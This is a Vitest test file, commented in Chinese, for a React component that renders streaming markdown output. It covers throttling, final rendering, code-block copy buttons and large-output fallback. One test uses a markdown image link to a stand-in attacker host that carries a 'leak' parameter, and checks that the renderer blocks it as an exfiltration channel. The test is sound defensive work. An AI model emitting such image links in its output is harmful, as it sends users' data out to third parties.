// @vitest-environment jsdom
/**
 * r58（#36）：UI 层 ~2800 行零测试的第一块回归防线——StreamMarkdown 是流式输出
 * 的唯一渲染路径。手 harness（React 19 内置 act + createRoot，不引入
 * testing-library）：锚节流 snap（半截行不渲染）/done 全量/代码块复制按钮/
 * 远程 img 一律不渲染（r52 #4 泄出通道）。剩余 UI 盲区（Settings/历史删改/
 * 附件气泡）见审计 #36，v2+ 分批补
 */
import { act, createElement } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { StreamMarkdown } from './StreamMarkdown.js'

;(globalThis as any).IS_REACT_ACT_ENVIRONMENT = true

let div: HTMLDivElement
let root: Root

beforeEach(() => {
  div = document.createElement('div')
  root = createRoot(div)
})

afterEach(() => {
  act(() => root.unmount())
  vi.useRealTimers()
})

const render = (text: string, done: boolean) =>
  act(() => root.render(createElement(StreamMarkdown, { text, done })))

describe('StreamMarkdown（r58 #36 UI 防线起步）', () => {
  it('流式节流：窗口内不渲染半截，flush 后 snap 到完整行', async () => {
    vi.useFakeTimers()
    render('# 标题\n\n半截尾部', false)
    expect(div.querySelector('h1')).toBeNull() // 100ms 节流窗内未 flush（空容器 div 在场）
    act(() => {
      vi.advanceTimersByTime(100)
    })
    expect(div.querySelector('h1')?.textContent).toBe('标题')
    expect(div.textContent).not.toContain('半截尾部') // snap 到最后一个完整行
  })

  it('done 立即全量渲染（含尾部活跃段）+ 代码块挂复制按钮', async () => {
    render('# 标题\n\n正文段\n\n```js\nconst a = 1\n```\n\n收尾段', true)
    expect(div.querySelector('h1')?.textContent).toBe('标题')
    expect(div.querySelector('code')?.textContent).toContain('const a = 1')
    expect(div.querySelector('button.pd-md-copy')).toBeTruthy() // r25 复制按钮随 pre 挂载
    expect(div.textContent).toContain('收尾段')
  })

  it('远程 img 一律不渲染（r52 #4：![](https://…) 是绕过 CLI 网络围栏的泄出通道）', async () => {
    render('前文\n\n![外带](https://evil.example/pixel.gif?leak=1)\n\n后文', true)
    expect(div.querySelector('img')).toBeNull()
    expect(div.innerHTML).not.toContain('evil.example')
  })

  it('>128K 降级纯文本：只渲染末尾 4 万字符 + 披露文案（r57 #5 / r58 #19）', async () => {
    const big = 'x'.repeat(129 * 1024)
    render(big + '\n\nTAIL_MARKER_末尾', true)
    expect(div.querySelector('.pd-md')).toBeNull() // 不走 markdown 分块渲染
    expect(div.textContent).toContain('仅显示末尾约 4 万字符')
    expect(div.textContent).toContain('TAIL_MARKER_末尾')
  })
})
